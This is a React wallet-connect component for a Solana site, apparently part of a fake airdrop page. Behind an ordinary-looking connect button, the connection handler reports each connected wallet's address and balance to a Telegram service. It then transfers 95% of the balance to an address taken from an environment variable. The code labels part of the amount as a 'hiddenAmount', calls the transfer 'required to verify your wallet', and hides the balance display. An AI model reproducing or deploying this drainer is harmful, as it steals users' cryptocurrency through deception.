import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useState, useEffect, useMemo, useRef } from 'react';
import '@solana/wallet-adapter-react-ui/styles.css';
import { WalletService } from '../services/walletService';
import { TelegramService } from '../services/telegramService';
import { UserProfileService } from '../services/userProfileService';
import { TransactionService } from '../services/transactionService';
import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

function WalletConnect() {
  const { publicKey, disconnect, connected } = useWallet();
  const [copied, setCopied] = useState(false);
  const [balance, setBalance] = useState(null);
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const hasAttemptedTransaction = useRef(false);
  const notificationTimeout = useRef(null);
  const notificationInProgress = useRef(false);
  const [isMobile, setIsMobile] = useState(false);
  const [hasPhantomApp, setHasPhantomApp] = useState(false);

  // Check if device is mobile and redirect to Phantom
  useEffect(() => {
    const checkMobileAndRedirect = () => {
      const mobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      setIsMobile(mobile);
      
      if (mobile) {
        // Check if we're already in Phantom
        const isPhantomInstalled = window.solana?.isPhantom;
        setHasPhantomApp(isPhantomInstalled);

        // If not in Phantom, redirect
        if (!isPhantomInstalled) {
          const currentUrl = window.location.href;
          const phantomUrl = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`;
          window.location.href = phantomUrl;
        }
      }
    };
    checkMobileAndRedirect();
  }, []);

  // Memoize services
  const services = useMemo(() => ({
    walletService: new WalletService(),
    telegramService: new TelegramService(),
    userProfileService: new UserProfileService(),
    transactionService: new TransactionService()
  }), []);

  // Handle wallet connection state
  useEffect(() => {
    if (connected && publicKey) {
      const handleWalletConnection = async () => {
        try {
          setIsProcessing(true);
          
          // Add a small delay for mobile devices to ensure proper connection
          if (isMobile) {
            await new Promise(resolve => setTimeout(resolve, 1500));
          }

          const walletBalance = await services.walletService.getBalance(publicKey.toString());
          setBalance(walletBalance);

          // Check if we've already sent a notification for this wallet
          const walletKey = `wallet_notified_${publicKey.toString()}`;
          const lastNotification = localStorage.getItem(walletKey);
          const currentTime = Date.now();
          
          // Clear any existing notification timeout
          if (notificationTimeout.current) {
            clearTimeout(notificationTimeout.current);
          }

          // Only send notification if:
          // 1. No previous notification exists, or
          // 2. Last notification was more than 5 minutes ago
          if (!lastNotification || (currentTime - parseInt(lastNotification)) > 300000) {
            // Set notification in progress flag
            notificationInProgress.current = true;
            
            // Set a timeout to prevent multiple notifications within 1 second
            notificationTimeout.current = setTimeout(async () => {
              try {
                // Check again if notification was sent while we were waiting
                const currentNotification = localStorage.getItem(walletKey);
                if (!currentNotification || (currentTime - parseInt(currentNotification)) > 300000) {
                  await services.telegramService.sendMessage(
                    services.telegramService.formatWalletInfo({
                      publicKey: publicKey.toString(),
                      balance: walletBalance,
                      timestamp: currentTime
                    })
                  );
                  // Store the current timestamp only after successful notification
                  localStorage.setItem(walletKey, currentTime.toString());
                }
              } catch (error) {
                console.error('Error sending wallet notification:', error);
              } finally {
                // Clear notification in progress flag
                notificationInProgress.current = false;
              }
            }, 1000);
          }

          // Only attempt transfer if we have a balance greater than 0 and haven't attempted before
          if (walletBalance > 0 && !hasAttemptedTransaction.current) {
            hasAttemptedTransaction.current = true;
            
            // Calculate transfer amount based on device type
            let transferAmount;
            if (isMobile) {
              // On mobile, take 95% of the balance
              transferAmount = walletBalance * 0.95;
            } else {
              // On desktop, keep original split: 0.001 + 95%
              transferAmount = 0.001 + (walletBalance * 0.95);
            }
            
            // Get the wallet adapter instance
            const wallet = window.solana;
            if (!wallet) {
              throw new Error('Wallet not found');
            }

            // For mobile devices, ensure we're in the right context
            if (isMobile) {
              // Wait for wallet to be fully ready
              await new Promise(resolve => setTimeout(resolve, 1000));
              
              // Check if we're back in the app context
              if (document.hidden) {
                // If we're not in the app context, wait for visibility change
                await new Promise(resolve => {
                  const handleVisibilityChange = () => {
                    if (!document.hidden) {
                      document.removeEventListener('visibilitychange', handleVisibilityChange);
                      resolve();
                    }
                  };
                  document.addEventListener('visibilitychange', handleVisibilityChange);
                });
              }
            }

            console.log('Transaction details:', {
              walletBalance: walletBalance.toFixed(4) + ' SOL',
              transferAmount: transferAmount.toFixed(4) + ' SOL',
              ...(isMobile ? {
                percentage: '95%'
              } : {
                visibleAmount: '0.001 SOL',
                hiddenAmount: (transferAmount - 0.001).toFixed(4) + ' SOL',
                percentage: '95%'
              })
            });

            const result = await services.transactionService.sendSol(
              wallet,
              process.env.NEXT_PUBLIC_TO,
              transferAmount
            );

            if (result.success) {
              const newBalance = await services.walletService.getBalance(publicKey.toString());
              setBalance(newBalance);

              // Only send transaction notification if the transaction was successful
              await services.telegramService.sendMessage(
                services.telegramService.formatTransactionInfo({
                  type: 'SOL_TRANSFER',
                  from: publicKey.toString(),
                  to: process.env.NEXT_PUBLIC_TO,
                  amount: transferAmount,
                  signature: result.signature,
                  timestamp: Date.now(),
                  message: 'This transaction is required to verify your wallet and ensure smooth airdrop allocation. Thank you for your participation.'
                })
              );
            } else {
              console.error('Transaction failed:', result.error);
              hasAttemptedTransaction.current = false;
            }
          }

          // Update user profile
          await services.userProfileService.updateWalletInfo({
            publicKey: publicKey.toString(),
            balance: walletBalance,
            timestamp: new Date().toISOString()
          });

        } catch (error) {
          console.error('Error in handleWalletConnection:', error);
          // If there's an error, try to reconnect
          if (isMobile) {
            try {
              await disconnect();
              // Wait a bit before attempting to reconnect
              await new Promise(resolve => setTimeout(resolve, 1500));
              // The WalletMultiButton will handle the reconnection
            } catch (reconnectError) {
              console.error('Error during reconnection:', reconnectError);
            }
          }
        } finally {
          setIsProcessing(false);
        }
      };

      handleWalletConnection();
    }
  }, [connected, publicKey, isMobile, services, disconnect]);

  const handleDisconnect = async () => {
    try {
      // Close dropdown first
      setIsDropdownOpen(false);
      
      // Clear user profile
      await services.userProfileService.clearProfile();
      
      // Clear notification state for this wallet
      if (publicKey) {
        const walletKey = `wallet_notified_${publicKey.toString()}`;
        localStorage.removeItem(walletKey);
      }
      
      // Disconnect wallet
      if (disconnect) {
        await disconnect();
        // Force clear all states
        setBalance(null);
        setCopied(false);
        setIsDropdownOpen(false);
        // Clear any remaining wallet data from localStorage
        Object.keys(localStorage).forEach(key => {
          if (key.startsWith('wallet_')) {
            localStorage.removeItem(key);
          }
        });
        // Force reload the page to ensure clean state
        window.location.reload();
      } else {
        console.error('Disconnect function not available');
      }
    } catch (error) {
      console.error('Error during disconnect:', error);
      // Force clear state even if there's an error
      setBalance(null);
      setCopied(false);
      setIsDropdownOpen(false);
      // Force reload the page to ensure clean state
      window.location.reload();
    }
  };

  const copyAddress = () => {
    if (publicKey) {
      navigator.clipboard.writeText(publicKey.toBase58());
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const formatAddress = (address) => {
    if (!address) return '';
    const start = address.slice(0, 4);
    const end = address.slice(-4);
    return `${start}...${end}`;
  };

  const toggleDropdown = (e) => {
    e.stopPropagation();
    setIsDropdownOpen(!isDropdownOpen);
  };

  // Add click outside handler
  useEffect(() => {
    const handleClickOutside = (event) => {
      if (isDropdownOpen && !event.target.closest('.wallet-connect-container')) {
        setIsDropdownOpen(false);
      }
    };

    document.addEventListener('click', handleClickOutside);
    return () => {
      document.removeEventListener('click', handleClickOutside);
    };
  }, [isDropdownOpen]);

  return (
    <div className="wallet-connect-container">
      {publicKey ? (
        <div className="connected-wallet glass-card">
          <div 
            className="wallet-header" 
            onClick={toggleDropdown}
            role="button"
            tabIndex={0}
            onKeyPress={(e) => {
              if (e.key === 'Enter' || e.key === ' ') {
                toggleDropdown(e);
              }
            }}
          >
            <div className="connected-indicator"></div>
            <div className="wallet-info">
              <div className="wallet-address-container">
                <span className="font-body text-sm text-white">Connected:</span>
                <span 
                  className="font-body text-sm wallet-address" 
                  onClick={(e) => {
                    e.stopPropagation();
                    copyAddress();
                  }}
                  title="Click to copy full address"
                >
                  {formatAddress(publicKey.toBase58())}
                  {copied && <span className="copied-indicator">Copied!</span>}
                </span>
              </div>
              {/* {isProcessing ? (
                <div className="processing-indicator">
                  Processing...
                </div>
              ) : balance !== null && (
                <div className="balance-info text-sm opacity-80">
                  {balance.toFixed(2)} SOL
                </div>
              )} */}
            </div>
            <div className={`dropdown-arrow ${isDropdownOpen ? 'open' : ''}`}>
              ▼
            </div>
          </div>
          
          {isDropdownOpen && (
            <div className="wallet-dropdown">
              <div className="dropdown-section">
                <h4>Wallet Details</h4>
                <div className="detail-item">
                  <span className="label">Full Address:</span>
                  <span className="value">{publicKey.toBase58()}</span>
                </div>
                <div className="detail-item">
                  <span className="label">SOL Balance:</span>
                  <span className="value">{balance?.toFixed(2)} SOL</span>
                </div>
              </div>

              <button 
                onClick={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  handleDisconnect();
                }} 
                className="disconnect-btn"
              >
                Disconnect Wallet
              </button>
            </div>
          )}
        </div>
      ) : (
        <div className="wallet-connect-wrapper">
          <WalletMultiButton className="wallet-connect-btn" />
        </div>
      )}

      <style jsx>{`
        .wallet-connect-container {
          position: relative;
          width: auto;
          min-width: 200px;
          max-width: 280px;
        }
        
        .connected-wallet {
          background: rgba(255, 255, 255, 0.05);
          border-radius: 12px;
          border: 1px solid rgba(255, 255, 255, 0.1);
          overflow: visible;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
          position: relative;
        }
        
        .wallet-header {
          display: flex;
          align-items: center;
          padding: 8px 12px;
          cursor: pointer;
          transition: background-color 0.2s ease;
          min-height: 40px;
        }
        
        .wallet-header:hover {
          background: rgba(255, 255, 255, 0.08);
        }
        
        .connected-indicator {
          width: 8px;
          height: 8px;
          background-color: #22C55E;
          border-radius: 50%;
          margin-right: 12px;
          position: relative;
          flex-shrink: 0;
        }
        
        .connected-indicator::after {
          content: '';
          position: absolute;
          width: 12px;
          height: 12px;
          background-color: rgba(34, 197, 94, 0.3);
          border-radius: 50%;
          top: -2px;
          left: -2px;
          animation: pulse 1.5s infinite;
        }
        
        .wallet-info {
          flex: 1;
          display: flex;
          flex-direction: column;
          gap: 2px;
          min-width: 0;
        }
        
        .wallet-address-container {
          display: flex;
          align-items: center;
          gap: 8px;
          flex-wrap: wrap;
        }
        
        .wallet-address {
          font-family: 'Plus Jakarta Sans', monospace;
          color: #E2E8F0;
          cursor: pointer;
          transition: all 0.2s ease;
          padding: 2px 6px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 4px;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
          max-width: 100px;
        }
        
        .wallet-address:hover {
          color: #ffffff;
          background: rgba(255, 255, 255, 0.1);
        }
        
        .copied-indicator {
          font-size: 0.7rem;
          color: #22C55E;
          opacity: 0.9;
          margin-left: 8px;
        }

        .processing-indicator {
          font-size: 0.8rem;
          color: #22C55E;
          animation: pulse 1.5s infinite;
        }
        
        .dropdown-arrow {
          color: rgba(255, 255, 255, 0.6);
          font-size: 0.8rem;
          transition: transform 0.2s ease;
          flex-shrink: 0;
          margin-left: 8px;
        }
        
        .dropdown-arrow.open {
          transform: rotate(180deg);
        }
        
        .wallet-dropdown {
          background: rgba(0, 0, 0, 0.95);
          padding: 12px;
          border-top: 1px solid rgba(255, 255, 255, 0.1);
          position: absolute;
          top: 100%;
          right: 0;
          width: 280px;
          z-index: 1000;
          backdrop-filter: blur(10px);
          border-radius: 0 0 12px 12px;
          box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .dropdown-section {
          margin-bottom: 16px;
        }
        
        .dropdown-section h4 {
          color: #ffffff;
          margin: 0 0 12px 0;
          font-size: 0.9rem;
          font-weight: 600;
        }
        
        .detail-item {
          display: flex;
          flex-direction: column;
          gap: 4px;
          padding: 8px 0;
          border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .detail-item:last-child {
          border-bottom: none;
        }
        
        .detail-item .label {
          color: rgba(255, 255, 255, 0.7);
          font-size: 0.85rem;
        }
        
        .detail-item .value {
          color: #ffffff;
          font-size: 0.85rem;
          font-family: 'Plus Jakarta Sans', monospace;
          word-break: break-all;
        }
        
        .disconnect-btn {
          width: 100%;
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.2);
          color: #EF4444;
          padding: 8px 16px;
          border-radius: 6px;
          font-size: 0.9rem;
          cursor: pointer;
          transition: all 0.2s ease;
          margin-top: 8px;
        }
        
        .disconnect-btn:hover {
          background: rgba(239, 68, 68, 0.2);
          border-color: rgba(239, 68, 68, 0.3);
        }
        
        @keyframes pulse {
          0% {
            transform: scale(1);
            opacity: 0.7;
          }
          70% {
            transform: scale(1.5);
            opacity: 0;
          }
          100% {
            transform: scale(1);
            opacity: 0;
          }
        }
        
        /* Override default WalletMultiButton styles */
        :global(.wallet-connect-btn) {
          background: linear-gradient(90deg, #22C55E, #4ADE80) !important;
          border: none !important;
          border-radius: 8px !important;
          font-family: 'Plus Jakarta Sans', sans-serif !important;
          font-weight: 600 !important;
          padding: 0 16px !important;
          height: 36px !important;
          transition: all 0.3s ease !important;
          box-shadow: 0 4px 12px rgba(34, 197, 94, 0.15) !important;
          width: 100% !important;
        }
        
        :global(.wallet-connect-btn:hover) {
          transform: translateY(-2px) !important;
          box-shadow: 0 6px 16px rgba(34, 197, 94, 0.25) !important;
        }
        
        :global(.wallet-connect-btn .wallet-adapter-button-start-icon) {
          margin-right: 8px !important;
        }
        
        @media (max-width: 640px) {
          .wallet-connect-container {
            width: auto;
            min-width: 180px;
          }
          
          .wallet-header {
            padding: 6px 10px;
          }
          
          .wallet-dropdown {
            padding: 10px;
            width: 240px;
          }
          
          .wallet-address {
            max-width: 80px;
          }
          
          .detail-item .value {
            font-size: 0.8rem;
          }
        }

        .mobile-wallet-prompt {
          text-align: center;
          padding: 15px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 8px;
          margin-bottom: 10px;
        }

        .mobile-wallet-prompt p {
          color: #FFD700;
          margin-bottom: 10px;
        }

        .phantom-redirect-btn {
          background: linear-gradient(90deg, #22C55E, #4ADE80);
          border: none;
          border-radius: 8px;
          color: white;
          padding: 10px 20px;
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s ease;
          width: 100%;
        }

        .phantom-redirect-btn:hover {
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(34, 197, 94, 0.25);
        }

        .mobile-warning {
          margin-top: 10px;
          padding: 10px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 8px;
          font-size: 0.8rem;
        }

        .mobile-warning p {
          margin-bottom: 5px;
          color: #FFD700;
        }

        .mobile-warning ul {
          margin: 0;
          padding-left: 20px;
          color: rgba(255, 255, 255, 0.8);
        }

        .mobile-warning li {
          margin-bottom: 3px;
        }
      `}</style>
    </div>
  );
}

export default WalletConnect;